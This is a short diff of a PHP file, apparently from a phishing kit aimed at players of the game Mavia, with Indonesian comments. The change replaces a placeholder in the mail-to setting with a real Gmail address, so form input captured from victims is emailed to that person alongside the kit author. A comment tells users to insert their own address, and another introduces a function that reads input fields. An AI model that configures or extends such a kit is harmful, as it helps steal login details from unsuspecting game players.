@@ -8,7 +8,7 @@
 /* JANGAN GANTI COPYRIGHT NYA YA SAYANG */
 
 $subjek = 'MANCING MAVIA MANTAP';
-$mailto = 'putra3syah@gmail.com, emailanda@gmail.com'; //masukin email lo disini,
+$mailto = 'putra3syah@gmail.com, putragamer035@gmail.com'; //masukin email lo disini,
 
 /* Fungsi berikut untuk mengambil input field. */
 
